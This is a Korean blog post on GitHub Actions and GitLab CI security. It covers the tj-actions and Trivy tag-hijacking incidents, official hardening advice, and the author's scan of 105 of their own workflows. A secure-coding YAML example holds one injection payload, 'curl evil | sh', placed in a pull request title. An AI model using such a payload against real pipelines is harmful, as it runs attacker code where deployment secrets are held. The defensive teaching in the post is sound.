---
layout: post
title: "CI 는 비밀을 쥔 채 남의 코드를 돌린다 — GitHub Actions·GitLab CI 보안, 내 리포 105개 워크플로 실측"
date: 2026-09-24 20:15:58 +0900
categories: [Security]
tags: [GitHub Actions, GitLab CI, CI/CD Security, Supply Chain, OWASP, DevSecOps]
---

CI 러너는 이상한 기계다. 클라우드 키·레지스트리 토큰·배포 자격증명을 쥐고 있는데, 그 위에서 도는 코드의 상당 부분은 **내가 쓴 게 아니다**. `uses: 누군가/무슨-액션@v4` 한 줄은 남의 리포에 있는 코드를 내 비밀과 같은 프로세스에서 실행하라는 뜻이다.

공급망 보안 전반(xz·Log4Shell·SBOM·SLSA)은 [오늘 먼저 올라온 글](/2026/09/24/software-supply-chain-security-xz-log4shell-ssdf-slsa/)이 다뤘다. 이 글은 범위를 좁혀 **파이프라인 설정 파일 자체**를 본다. 최근 실제로 터진 두 사고로 공격 모양을 확인하고, GitHub·GitLab 공식 문서의 대책을 정리한 다음, **내 계정의 워크플로 105개를 전수 검사한 결과**를 공개한다.

## 1. OWASP 가 CI/CD 를 따로 떼어 낸 이유

OWASP 는 웹 Top 10 과 별개로 **Top 10 CI/CD Security Risks** 를 낸다. 서문에 따르면 공격자는 CI/CD 가 조직의 "왕관의 보석"으로 가는 효율적인 경로라는 걸 깨달았고, 새 서비스 연동이 "코드 1~2줄 추가"로 끝나는 구조가 공격면을 바꿨다 ([OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)). 이 글에 나오는 항목은 네 개다.

- **CICD-SEC-3 Dependency Chain Abuse** — 가져다 쓴 액션·패키지가 오염됨
- **CICD-SEC-4 Poisoned Pipeline Execution (PPE)** — 공격자가 파이프라인이 실행할 코드·설정을 조작
- **CICD-SEC-5 Insufficient PBAC** — 파이프라인에 필요 이상의 권한
- **CICD-SEC-6 Insufficient Credential Hygiene** — 비밀이 로그·아티팩트로 샘

## 2. 실제로 터진 두 사고 — 둘 다 "태그를 옮겼다"

### tj-actions/changed-files (2025-03, CVE-2025-30066)

- 공격자는 메인테이너 봇 계정의 PAT 를 탈취해, **기존 버전 태그 여러 개를 악성 커밋 하나로 다시 가리키게** 했다 ([GHSA-mrrh-fwg8-r2c3](https://github.com/advisories/ghsa-mrrh-fwg8-r2c3), [StepSecurity 분석](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised)).
- 악성 코드는 러너의 `Runner.Worker` 프로세스 메모리를 긁어 비밀을 찾아, 이중 base64 로 **빌드 로그에 출력**했다. 공개 리포라면 로그를 읽는 누구나 비밀을 얻는다.
- GitHub 권고 기준 영향 리포는 2만 3천 개 이상. CISA 는 이 건과 연쇄된 reviewdog 건(CVE-2025-30154)을 KEV(실제 악용 취약점 목록)에 올렸다 ([CISA 경보](https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction)).
- 탐지는 서명이 아니라 **러너의 이상한 외부 연결**(gist.githubusercontent.com)에서 나왔다.

### Trivy 생태계 (2026-03, CVE-2026-33634)

보안 스캐너 자체가 당했다는 점에서 더 아프다 ([GHSA-69fq-xp46-6x23](https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23), [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-33634)).

- 2026-03-19, 탈취한 자격증명으로 `aquasecurity/trivy-action` 의 **77개 태그 중 76개**와 `setup-trivy` 의 태그 7개 전부를 인포스틸러가 든 커밋으로 force-push 했다. 악성 단계는 정상 스캔 **전에** 돌았다.
- 원인은 3월 1일 1차 사고 뒤 **자격증명 교체가 원자적이지 않았던 것**이다. 교체하는 며칠 사이에 공격자가 새 토큰까지 가져갔을 수 있다고 Aqua 가 직접 적었다 ([사고 기록 #10425](https://github.com/aquasecurity/trivy/discussions/10425)).
- 살아남은 건 딱 하나, `0.35.0` 이다. 이 태그만 GitHub 의 **immutable releases** 가 켜진 뒤에 게시돼서 옮길 수 없었다.
- 권고 문구는 명확하다: "변경 가능한 버전 태그 말고, 전체 커밋 SHA 로 고정하라."

두 사고의 공통점은 **코드 리뷰를 한 번도 거치지 않았다**는 것이다. 사용자 워크플로 파일은 한 글자도 바뀌지 않았다. `@v4` 가 가리키는 대상만 바뀌었다.

## 3. 공식 대책 — GitHub 와 GitLab 은 같은 말을 한다

### ① 참조를 불변으로 고정

- GitHub: "**전체 길이 커밋 SHA 로 고정하는 것이 현재 액션을 불변 릴리스로 쓰는 유일한 방법**"이다. 저장소·조직 단위로 SHA 고정을 강제하는 정책도 있다 ([Secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)).
- GitLab: 컨테이너 이미지는 `node:latest` 대신 `node@sha256:…` 다이제스트로, 패키지는 `npm ci`·`pip --require-hashes` 처럼 락파일 기준으로 받으라고 한다. 이미지 참조에 변수를 넣지 말라는 것도 같은 이유다 ([GitLab Pipeline security](https://docs.gitlab.com/ci/pipeline_security/)).

### ② 토큰 권한은 읽기부터

- GitHub: 저장소 쓰기 권한이 있는 사람은 **모든 저장소 비밀을 읽을 수 있다**. `GITHUB_TOKEN` 기본값은 contents 읽기로 두고, 필요한 잡에서만 올리라고 한다.
- GitLab: `CI_JOB_TOKEN` 은 잡이 도는 동안만 유효하고, 다른 프로젝트에 접근하려면 **대상 프로젝트의 허용목록**에 올라가 있어야 한다. 대신 권한은 파이프라인을 트리거한 사용자 수준을 따라간다 ([CI/CD job token](https://docs.gitlab.com/ci/jobs/ci_job_token/)).

### ③ 신뢰할 수 없는 입력을 셸에 꽂지 않기 (PPE)

PR 제목은 공격자가 쓴 문자열이다. 이걸 `run:` 에 바로 넣으면 셸 인젝션이다. GitHub 문서의 처방은 중간 환경변수를 거치는 것이다.

{% raw %}
```yaml
# 위험: 제목에 a"; curl evil | sh; " 를 넣으면 실행된다
- run: echo "${{ github.event.pull_request.title }}"

# 안전: 값은 환경변수로만 전달되고 셸 코드가 되지 않는다
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```
{% endraw %}

### ④ `pull_request_target` 은 "포크 코드를 빌드하지 않는" 용도만

GitHub Security Lab 은 이것을 **pwn request** 라고 부른다 ([Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)). `pull_request_target` 은 포크 PR 에도 **쓰기 토큰과 비밀**을 준다. 라벨 붙이기·댓글 달기 용도로 만든 트리거다. 여기에 PR 의 head 를 명시적으로 체크아웃해서 빌드하면, 포크 작성자의 `package.json` postinstall 한 줄로 비밀이 넘어간다. 빌드는 권한 없는 `pull_request` 에서 하고, 결과는 `workflow_run` 으로 넘기는 2단 구조가 정석이다.

### ⑤ 비밀 마스킹을 믿지 말 것

GitHub 스스로 "자동 마스킹은 보장되지 않는다"고 적는다. 마스킹은 정확한 문자열 일치에 기대므로 JSON 덩어리 비밀이나 base64 로 변형한 값은 새 나간다. tj-actions 가 **이중 base64** 로 찍은 이유가 이것이다. GitLab 도 CI/CD 변수는 비밀관리 솔루션보다 덜 안전하고, 파이프라인을 잘못 설정하면 노출된다고 적는다.

## 4. 내 리포에 대보기 — 105개 워크플로 전수 검사

2026-09-24, 내 GitHub 계정의 아카이브·포크가 아닌 리포 **231개**(공개 17 / 비공개 214)에서 `.github/workflows` 를 API 로 전부 받아 정적 검사했다. 워크플로가 있는 리포는 71개, 파일은 105개다.

| 항목 | 결과 |
|---|---|
| 액션 참조(`uses:`) 총계 | 613 |
| 그중 전체 커밋 SHA 고정 | **125 (20.4%)** |
| 서드파티 액션(actions/·github/·내 계정 제외) | 255 — SHA 고정 59 (23.1%) |
| 브랜치 참조(`@main`·`@master`) | 19 — 그중 `aquasecurity/trivy-action@master` 7건(비공개 리포 6개) |
| `tj-actions`·`reviewdog` 사용 | 0 |
| `pull_request_target` | 3건 — PR head 체크아웃은 **없음** |
| `run:` 에 PR 제목·본문·댓글 직접 삽입(휴리스틱) | 0 |
| `permissions:` 키가 없는 워크플로 | 32개 리포 — 저장소 기본값이 read 30 / **write 2**(공개 1) |

### 해석

- **다섯 개 중 네 개는 옮겨질 수 있는 참조다.** 가장 많이 쓰는 서드파티는 `docker/login-action`(63회), `docker/build-push-action`(46회)였다. 레지스트리 로그인 토큰을 받는 바로 그 단계들이다.
- **Trivy 사고 창에 운 좋게 비켜 갔다.** `trivy-action@master` 를 쓰는 리포 6개를 GitHub API 로 조회해 보니 2026-03-19~20 사이 워크플로 실행은 0건이었다. 공격은 태그를 옮겼는데 이쪽은 브랜치를 따라가서 직접 해당은 아닐 수 있다. 하지만 메인테이너도 "master 가 100% 안전했다고 말할 수 없다"고 답했다. 게다가 브랜치 참조는 태그보다 **더** 움직이는 참조다. 이번에 안 걸린 건 설계 덕이 아니라 그 이틀 동안 커밋을 안 해서다.
- **`pull_request_target` 3건**은 2024년에 만든 비공개 리포이고, 체크아웃이 기본값(대상 리포의 base)이라 pwn request 조건에는 해당하지 않는다. 그래도 AWS 키를 쓰는 배포 워크플로가 이 트리거에 붙어 있을 이유는 없다. `pull_request`/`push` 로 바꾸는 게 맞다.
- **기본 권한 write** 인 리포 2개는 2023년 GitHub 기본값 변경 전에 만든 리포로 보인다. 워크플로에 `permissions:` 가 없으면 저장소 기본값을 그대로 받는다.

### 검사의 한계

- 정규식 기반 정적 검사다. 인젝션 0건은 "`run:` 줄에 위험한 표현식이 바로 들어간 경우가 없다"는 뜻일 뿐, 스크립트 파일 안이나 재사용 워크플로를 거친 흐름은 보지 않았다. 제대로 보려면 [zizmor](https://github.com/zizmorcore/zizmor) 같은 전용 도구나 CodeQL 의 Actions 분석이 필요하다.
- GitLab 쪽은 이번 표본이 없다(내 파이프라인은 전부 GitHub). GitLab 부분은 공식 문서 정리에 그친다.
- 개인 계정 하나의 표본이라 업계 비율의 근거가 아니다.

## 5. 이번 주에 할 것 (비용 순)

1. **`permissions: contents: read` 를 워크플로 최상단에** — 한 줄이고, 기본값이 write 인 옛 리포를 구해 준다.
2. **서드파티 액션부터 SHA 고정** — 태그는 주석으로 남긴다(`@<40자리> # v4.1.0`). Dependabot 은 SHA 고정된 액션도 갱신 PR 을 올려 준다.
3. **`@master`·`@main` 참조 제거** — 이번 검사에서 19건.
4. **`pull_request_target` 전수 점검** — PR head 체크아웃이 있으면 즉시 2단 구조로.
5. **탐지 한 줄** — tj-actions 는 러너의 예상 밖 외부 연결로 잡혔다. 이그레스 감사는 서명 DB 가 모르는 새 공격도 잡는다.
6. **사고 대응은 원자적으로** — Trivy 2차 사고의 원인은 교체 중인 토큰이었다. 비밀 교체는 "새 키 발급 → 전부 교체 → 옛 키 폐기"를 한 번에 끝낸다.

## 맺으며

CI 보안은 거창한 도구보다 **참조가 움직이느냐**, **토큰이 무엇을 할 수 있느냐** 두 질문으로 대부분 정리된다. 내 워크플로 기준 답은 "80% 가 움직이고, 일부는 필요 이상을 할 수 있다"였다. 사고가 안 난 건 운이었다. 고정한 참조는 공격자가 옮길 수 없다.

## References

- OWASP, *Top 10 CI/CD Security Risks* (Krivelevich, Gil). <https://owasp.org/www-project-top-10-ci-cd-security-risks/>
- GitHub Docs, *Secure use reference* (GitHub Actions). <https://docs.github.com/en/actions/reference/security/secure-use>
- GitHub Security Lab, *Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests* (2021, 2026-06 갱신). <https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/>
- GitLab Docs, *Pipeline security*. <https://docs.gitlab.com/ci/pipeline_security/>
- GitLab Docs, *CI/CD job token*. <https://docs.gitlab.com/ci/jobs/ci_job_token/>
- GitHub Advisory Database, *GHSA-mrrh-fwg8-r2c3 (CVE-2025-30066) tj-actions/changed-files*. <https://github.com/advisories/ghsa-mrrh-fwg8-r2c3>
- CISA, *Supply Chain Compromise of Third-Party tj-actions/changed-files (CVE-2025-30066) and reviewdog/action-setup@v1 (CVE-2025-30154)*, 2025-03-18 (03-26 갱신). <https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction>
- StepSecurity, *Harden-Runner detection: tj-actions/changed-files action is compromised* (최초 탐지 측 1차 분석). <https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised>
- Aqua Security, *GHSA-69fq-xp46-6x23: Trivy ecosystem supply chain temporarily compromised* (CVE-2026-33634). <https://github.com/aquasecurity/trivy/security/advisories/GHSA-69fq-xp46-6x23>
- Aqua Security, *Trivy Security incident 2026-03-19* (discussion #10425). <https://github.com/aquasecurity/trivy/discussions/10425>
- NIST NVD, *CVE-2026-33634*. <https://nvd.nist.gov/vuln/detail/CVE-2026-33634>
- 실측: 2026-09-24 GitHub REST API 로 수집한 본인 계정 워크플로 105개(정규식 정적 분석).
